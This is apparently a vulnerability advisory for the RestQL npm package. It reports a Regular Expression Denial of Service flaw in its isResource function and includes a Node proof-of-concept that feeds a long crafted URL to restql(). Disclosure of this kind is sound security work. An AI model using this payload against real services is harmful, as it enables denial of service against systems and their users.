# Overview

RestQL allows you to dynamically resolve the nested-linked resources of a RESTful API.

This package is vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a long string to `isResource` function in `utils/isResource.js` can cause a Denial of Service attack.

# PoC

```node
var restql = require("restql");

/**
 * @constant {string} resource The resource to fetch.
 */
const url =
  "https://huntr.dev.asdasdasd.asdsadasdsadsad.asdasdsad.asdsadasdsa.sadasdsadas.dasdasasdasd.432asdas3423.3423423423.234234243.234234234.23423423.24234.";

/**
 * @constant {Object} resolver The resolver to apply.
 */
const resolver = {
  "abilities[]?.ability.url": {
    "generation.url": {
      "main_region.url": null,
    },
  },
  "stats[].stat.url?": {
    "affecting_natures.increase[].url": null,
    "affecting_natures.decrease[].url": null,
  },
  "moves[].move?.url": null,
};

/**
 * @constant {Object} options, the options to bypass.
 */
const options = {
  // ...
};

(async () => {
  try {
    const data = await restql(url, resolver, options);

    console.log(data);
  } catch (error) {
    console.error(error.message);
  }
})();
```
